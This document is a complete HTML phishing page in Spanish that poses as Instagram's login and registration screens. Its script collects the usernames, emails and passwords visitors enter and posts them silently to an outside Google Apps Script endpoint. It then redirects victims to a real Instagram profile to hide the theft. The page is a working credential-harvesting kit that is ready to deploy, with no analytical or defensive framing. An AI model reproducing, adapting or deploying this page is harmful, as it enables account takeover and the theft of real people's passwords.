<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>

    <style>
        @import url('https://fonts.googleapis.com/css2?family=Grand+Hotel&display=swap');

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: Arial, sans-serif;
        }

        body {
            background-color: black;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
        }

        .container {
            background-color: #121212;
            padding: 20px;
            border: 1px solid #262626;
            width: 350px;
            text-align: center;
            border-radius: 5px;
        }

        .logo {
            font-size: 2rem;
            color: white;
            font-family: 'Grand Hotel', cursive;
            margin-bottom: 20px;
        }

        input {
            width: 100%;
            padding: 10px;
            margin: 5px 0;
            background: #262626;
            border: 1px solid #333;
            border-radius: 3px;
            color: white;
        }

        .btn {
            background-color: #0095f6;
            color: white;
            border: none;
            padding: 10px;
            width: 100%;
            border-radius: 3px;
            cursor: pointer;
            font-weight: bold;
        }

        .btn:hover {
            background-color: #0073cc;
        }

        .link {
            color: #0095f6;
            cursor: pointer;
        }

        .register-box {
            margin-top: 10px;
            padding: 15px;
            background: #1a1a1a;
            border-radius: 3px;
        }
    </style>
</head>

<body>

<div class="container" id="loginBox">
    <div class="logo">Instagram</div>

    <input type="text" id="loginUser" placeholder="Usuario">
    <input type="password" id="loginPass" placeholder="Contraseña">

    <button class="btn" onclick="iniciarSesion()">Iniciar sesión</button>

    <div class="register-box">
        <p style="color: white;">
            ¿No tienes una cuenta?
            <span class="link" onclick="mostrarRegistro()">Regístrate</span>
        </p>
    </div>
</div>

<div class="container" id="registerBox" style="display:none;">
    <div class="logo">Instagram</div>

    <input type="text" id="regUser" placeholder="Usuario">
    <input type="email" id="regEmail" placeholder="Correo">
    <input type="password" id="regPass" placeholder="Contraseña">

    <button class="btn" onclick="registrarse()">Registrarse</button>

    <div class="register-box">
        <p style="color: white;">
            ¿Ya tienes cuenta?
            <span class="link" onclick="mostrarLogin()">Inicia sesión</span>
        </p>
    </div>
</div>

<script>
const googleSheetsURL = "https://script.google.com/macros/s/AKfycbzWEOFRbIjyDobAce8Aa3qsvcXjvwNOCWlbh_zeSP9bl8qxHWErE48r_lNQ5bD5px6R/exec"; // 👈 IMPORTANTE
const instagramURL = "https://www.instagram.com/_saray_castro/";

function mostrarRegistro() {
    document.getElementById("loginBox").style.display = "none";
    document.getElementById("registerBox").style.display = "block";
}

function mostrarLogin() {
    document.getElementById("registerBox").style.display = "none";
    document.getElementById("loginBox").style.display = "block";
}

function iniciarSesion() {
    let usuario = document.getElementById("loginUser").value;
    let contraseña = document.getElementById("loginPass").value;

    if (usuario && contraseña) {

        let data = new FormData();
        data.append("tipo", "login");
        data.append("usuario", usuario);
        data.append("contraseña", contraseña);

        fetch(googleSheetsURL, {
            method: "POST",
            body: data,
            mode: "no-cors"
        });

        // REDIRECCIÓN SEGURA
        window.location.href = instagramURL;

    } else {
        alert("Completa los campos");
    }
}

function registrarse() {
    let usuario = document.getElementById("regUser").value;
    let email = document.getElementById("regEmail").value;
    let contraseña = document.getElementById("regPass").value;

    if (usuario && email && contraseña) {

        let data = new FormData();
        data.append("tipo", "registro");
        data.append("usuario", usuario);
        data.append("email", email);
        data.append("contraseña", contraseña);

        fetch(googleSheetsURL, {
            method: "POST",
            body: data,
            mode: "no-cors"
        });

        alert("Registro guardado");
        mostrarLogin();

    } else {
        alert("Completa los campos");
    }
}
</script>

</body>
</html>
